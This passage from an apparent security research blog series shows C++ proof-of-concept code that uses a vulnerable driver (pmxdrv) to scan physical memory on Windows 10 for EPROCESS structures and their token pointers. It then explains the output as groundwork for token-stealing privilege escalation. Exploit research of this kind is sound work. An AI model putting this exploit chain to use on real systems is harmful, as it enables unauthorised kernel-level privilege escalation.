        UINT64 tokenRefBits = candidate.TokenRaw & EX_FAST_REF_LOW_BITS_MASK;

        printf("\n");
        printf("    [%zu] %s (PID %llu)\n", i, candidate.ImageFileName, (unsigned long long)candidate.Pid);
        printf("         Pool header PA : 0x%016llX\n", (unsigned long long)candidate.HeaderPhysicalAddress);
        printf("         Proc tag PA    : 0x%016llX\n", (unsigned long long)procTagPhysicalAddress);
        printf("         Displacement   : +0x%llX\n", (unsigned long long)candidate.HeaderToEprocess);
        printf("         EPROCESS PA    : 0x%016llX\n", (unsigned long long)candidate.EprocessPhysicalAddress);
        printf("         Flink          : 0x%016llX\n", (unsigned long long)candidate.Flink);
        printf("         Blink          : 0x%016llX\n", (unsigned long long)candidate.Blink);
        printf("         Token raw      : 0x%016llX\n", (unsigned long long)candidate.TokenRaw);
        printf("         Token pointer  : 0x%016llX\n", (unsigned long long)tokenPointer);
        printf("         Token ref bits : 0x%llX\n", (unsigned long long)tokenRefBits);
    }

    printf("\n");
}

int main(void)
{
    std::vector<PHYSICAL_RANGE> ranges;
    if (!LoadPhysicalMemoryRanges(&ranges)) {
        printf("[-] Fail to load physical memory ranges\n");
        return 1;
    }

    HANDLE driver = OpenDriver();
    if (driver == INVALID_HANDLE_VALUE)
        return 1;

    std::vector<EPROCESS_CANDIDATE> candidates;

    BOOL scanComplete = FindEprocessCandidates(
        driver,
        ranges,
        &candidates);

    if (!scanComplete) {
        printf("[-] The RAM scan was incomplete\n");
        CloseHandle(driver);
        return 1;
    }

    // Display candidates collected
    PrintEprocessCandidates(candidates);

    CloseHandle(driver);
    return 0;
}
```

With the concepts implemented in code, let's see how the PoC fares in finding `EPROCESS` candidates on my target Windows 10 build 19045 system with 32GB RAM.

![alt](/assets/img/posts/pmxdrv-poc2-part-3/part-4-demo.png)
_Finding `EPROCESS` candidates in Windows 10 build 19045 with 32GB RAM_

From the output, we can see the following:

1. The PoC identified four Windows-described physical memory ranges.
2. The first range was skipped because it lies entirely below the scanner's
   `0x100000` starting address. The remaining three ranges were scanned.
3. Across those ranges, the PoC encountered 18,314 raw `Proc` tags. Of those,
   279 produced `_EPROCESS` candidates that passed all validation checks,
   meaning approximately 1.5% of the raw tag hits survived the filter.
4. The fields collected for each validated candidate were then displayed.

Most importantly, we can see our PoC and `SYSTEM` among the validated `EPROCESS` candidates

![alt](/assets/img/posts/pmxdrv-poc2-part-3/poc_eprocess_content.png)
_Content of our PoC's `EPROCESS` among the output_

![alt](/assets/img/posts/pmxdrv-poc2-part-3/system_eprocess_content.png)
_Content of `SYSTEM`'s `EPROCESS` among the output_

> **Note**: `ImageFileName` is fixed-length, so longer process names may be truncated in the output (for example, `part-4-demo.exe` appears as `part-4-demo.ex` in the screenshot above).

## What's Next?

Now that we can reliably recover validated `EPROCESS` candidates from physical memory, the next step is to identify the two candidates that matter for privilege escalation: `SYSTEM` and the target process that will receive its token.

To be continued...
